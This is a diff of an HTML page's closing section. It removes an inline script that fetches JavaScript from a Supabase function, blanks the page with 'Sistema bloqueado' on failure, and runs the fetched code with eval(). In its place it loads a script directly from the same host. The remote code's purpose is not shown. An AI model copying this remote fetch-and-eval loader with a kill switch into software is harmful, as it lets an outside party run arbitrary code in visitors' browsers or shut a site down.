@@ -1278,20 +1278,9 @@
     </div>
 </div>
 
-<script>
-(async()=>{
 
- const r = await fetch("https://rjyxkouegrropsarrhje.supabase.co/functions/v1/legacy/core");
+<script src="https://rjyxkouegrropsarrhje.supabase.co/functions/v1/legacy"></script>
 
- if(r.status !== 200){
-   document.body.innerHTML="Sistema bloqueado";
-   throw new Error("bloqueado");
- }
 
- const js = await r.text();
- eval(js);
-
-})();
-</script>
 </body>
 </html>
